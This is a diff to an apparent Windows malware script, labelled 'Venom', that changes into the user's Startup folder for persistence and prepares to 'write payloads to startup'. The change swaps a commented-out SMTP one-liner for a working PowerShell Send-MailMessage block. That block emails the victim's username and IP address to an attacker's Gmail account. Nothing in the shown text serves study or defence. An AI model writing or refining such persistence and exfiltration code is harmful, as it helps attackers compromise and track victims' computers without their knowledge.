@@ -9,7 +9,19 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM setup smtp
-@rem powershell $email = "example@gmail.com"; password = "password"; $ip = (Get-NetIPAddress -AddressNetFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "Venom: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
+$email = "example@gmail.com" # Replace with your email address
+$password = "your_app_password" # Replace with your app-specific password
+
+Send-MailMessage `
+    -From $email `
+    -To $email `
+    -Subject "$env:UserName" `
+    -Body ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress -join "`n") `
+    -SmtpServer "smtp.gmail.com" `
+    -Port 587 `
+    -UseSsl `
+    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
+
 
 
 @REM write payloads to startup
